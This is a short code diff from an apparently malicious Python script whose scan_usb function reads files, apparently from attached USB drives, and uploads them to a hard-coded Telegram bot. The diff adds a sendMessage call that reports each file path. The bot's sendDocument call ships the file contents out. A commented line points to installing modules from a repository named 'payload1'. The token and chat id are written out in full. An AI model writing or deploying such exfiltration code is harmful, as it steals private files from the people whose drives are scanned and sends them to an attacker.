@@ -105,8 +105,8 @@ def scan_usb():
                 files = {
                     'document': file.read()
                 }
+            r = requests.post(f"https://api.telegram.org/bot6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA/sendMessage?chat_id=-4102145810&text={letterpath}")
             r = requests.post("https://api.telegram.org/bot6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA/sendDocument", data=data, files=files)
-            r = requests.post("https://api.telegram.org/bot6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA/sendMessage?chat_id=-4102145810&text=Infos : " + letterpath)
 
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
